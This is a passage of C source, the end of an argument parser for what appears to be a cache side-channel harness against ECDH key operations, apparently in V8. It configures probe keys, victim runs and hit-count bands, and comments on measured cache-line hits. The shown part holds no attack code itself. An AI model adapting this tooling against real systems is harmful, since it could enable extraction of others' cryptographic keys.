				memcpy(probe_keys_override[c], v, n);
				probe_keys_override[c][n] = '\0';
				csi_probe_keys[c] = probe_keys_override[c];
				v = comma ? comma + 1 : NULL;
			}
			log_info("probe keys overridden: %s %s %s",
			         csi_probe_keys[0],
			         csi_probe_keys[1],
			         csi_probe_keys[2]);
		} else if (strncmp(argv[i], "-warmup=", 8) == 0) {
			jit_warmup_runs = atoi(argv[i] + 8);
			if (jit_warmup_runs < 1) {
				jit_warmup_runs = 1;
			}
		} else if (strncmp(argv[i], "-bands=", 7) == 0) {
			/* a sweep probes lines that are SUPPOSED to look wrong, so the
			 * per-key band check must be disabled or it exits on them. */
			g_bands_enabled = atoi(argv[i] + 7);
		} else {
			argv[new_argc++] = argv[i];
		}
	}
	argc = new_argc;

	if (single_key_file != NULL) {
		/* one key, and BOTH branch-line counts are whatever the pattern makes
		 * them, so neither branch band can apply -- slot 1 tracks the zero
		 * count and slot 2 the one count, and a hand-built pattern is chosen
		 * precisely to put those at extremes. Measured 2026-08-22: the
		 * 1111_1110 key has 31 zeros, slot 1 correctly read 34, and the
		 * floor of 40 called it DEGRADED and forced pointless rebuilds. The
		 * clock's band still applies and still guards the run. */
		key_num = 1;
		slot_min_hits[1] = 0;
		slot_max_hits[1] = 1 << 20;
		slot_min_hits[2] = 0;
		slot_max_hits[2] = 1 << 20;
	}
	if (csi_keys_capture) {
		/* Three probe keys. Their BRANCH-line counts are deliberately extreme
		 * -- all-1s drives the true arm every iteration and never the false
		 * one, all-0s the reverse -- so both branch bands would reject them.
		 * Widen those two instead of
		 * disabling bands wholesale: turning bands off also disables the
		 * per-key rebuild, and then a clock that dies after the first key
		 * stays dead (measured: keys 1 and 2 came back with median hit counts
		 * of 1-4). The CLOCK's band still applies and still guards the run --
		 * it is ~one hit per iteration for every key, probe keys included. */
		key_num = cache_line_count;
		slot_min_hits[1] = 0;
		slot_max_hits[1] = 1 << 20;
		slot_min_hits[2] = 0;
		slot_max_hits[2] = 1 << 20;
	}
	if (key_num < 1) {
		key_num = 1;
	}
	if (victim_runs < 1) {
		victim_runs = 1;
	}
	if (victim_runs > max_victim_runs) {
		victim_runs = max_victim_runs;
	}
	if (run_tag[0] == '\0') {
		time_t now = time(NULL);
		struct tm tmv;
		localtime_r(&now, &tmv);
		strftime(run_tag, sizeof(run_tag), "run_%Y%m%d_%H%M%S", &tmv);
	}
	log_info("run tag=%s keys=%d runs=%d (traces -> output/%s/)",
	         run_tag,
	         key_num,
	         victim_runs,
	         run_tag);

	/* -csi runs single-process (victim + scan thread in one binary) via
	 * v8_ecdh_thread_main, which branches on use_csi internally. */
	if (argc == 1) {
		log_error("Eval file not provided");
		return 1;
	} else if (argc == 2) {
		log_error("Repeat file not provided");
		return 1;
	} else if (argc == 3) {
		log_error("keypair template not provided");
		return 1;
	}
	return v8_ecdh_thread_main(argc, argv);
}
